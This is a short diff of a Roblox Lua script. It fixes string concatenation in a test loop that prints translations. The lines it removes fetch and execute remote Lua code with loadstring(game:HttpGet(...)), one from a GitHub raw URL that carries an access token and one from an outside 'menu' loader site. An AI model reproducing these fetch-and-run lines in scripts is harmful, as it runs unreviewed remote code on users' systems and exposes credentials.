@@ -29,21 +29,6 @@ local testStrings = {
 }
 
 for _, str in ipairs(testStrings) do
-    print("原文本: " + str + " => 翻译后: " + translateText(str))
+    -- 注意这里：把原来的加号 + 全部改成了连接符 ..
+    print("原文本: " .. str .. " => 翻译后: " .. translateText(str))
 end
-
-
--- 加载你的远程翻译链接
-local success, err = pcall(function()
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/Emperor167/roblox/refs/heads/main/%E8%BF%9C%E7%A8%8B%E7%BF%BB%E8%AF%91%E9%93%BE%E6%8E%A5.lua?token=GHSAT0AAAAAAEI5RAEMYTMQ6PSBLFYNNI6C2WFVN6Q"))()
-end)
-
-if not success then
-    warn("翻译模块加载失败:", err)
-else
-    print("翻译模块加载成功！")
-end
-
--- 随后加载目标菜单脚本
-task.wait(1)
-loadstring(game:HttpGet("https://platinstudio.xyz/loader/UwUInk"))()
